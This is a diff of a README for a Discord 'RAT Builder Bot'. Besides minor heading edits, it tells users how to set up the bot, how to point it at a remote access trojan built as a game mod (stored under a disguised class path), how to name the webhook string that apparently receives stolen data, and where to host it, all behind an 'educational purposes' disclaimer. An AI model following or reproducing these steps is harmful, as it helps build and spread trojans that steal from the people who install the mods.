@@ -1,6 +1,6 @@
 <h1 align="center">⭐ Gute Nacht's RAT Builder Bot ⭐</h1>
 
-<h1 align="center"> Setting up your bot </h1>
+<h1 align="center">Setting up your bot</h1>
 **1.)** Visit [Discord's Developer Portal](https://discord.com/developers/applications) (If it takes you to a login screen, log into your Discord and revisit the page)
 
 **2.)** Click the **"New Application"** button on the top right of your screen, choose the name of the application, agree to the terms and click "Create".
@@ -11,7 +11,7 @@
 
 **5.)** Open the **"config.json"** file and add your bot's token to the **"token"** field
 
-# Setting up your mod
+<h1 align="center">Setting up your mod</h1>
 If you already have one, that's good! If you don't, I don't know what to tell you. Make one I guess?
 
 **1.)** Open your rat's mdk and nagivate to **src/main/java** and then find your main class path. For me its' org/json/jsonLoader.java (the .java is necessary)
@@ -22,13 +22,13 @@ If you already have one, that's good! If you don't, I don't know what to tell yo
 
 4.) Go into your main class and find the name of the string where the webhook is expected (string name will be bold) like: String **pb** = "https://discord.com/api/..." **IT MUST BE JUST THE NAME, NOTHING ELSE.**
 
-# Hosting
+That's all, enjoy creating your server. 
+
+<h1 align="center">Hosting</h1>
 
 I personally recommend [Contabo](https://contabo.com/), you can also host it on your PC if you'd like.
 
-That's all, enjoy creating your server. 
-
-# Disclaimer
+<h1 align="center">Disclaimer</h1>
 I am not liable for any malicious use of my builder, nor am I liable for any malicious use of the files created by my builder. This is made for educational purposes
 
 You may edit this code all you want. If you want to post it somewhere, please give me credit. :)
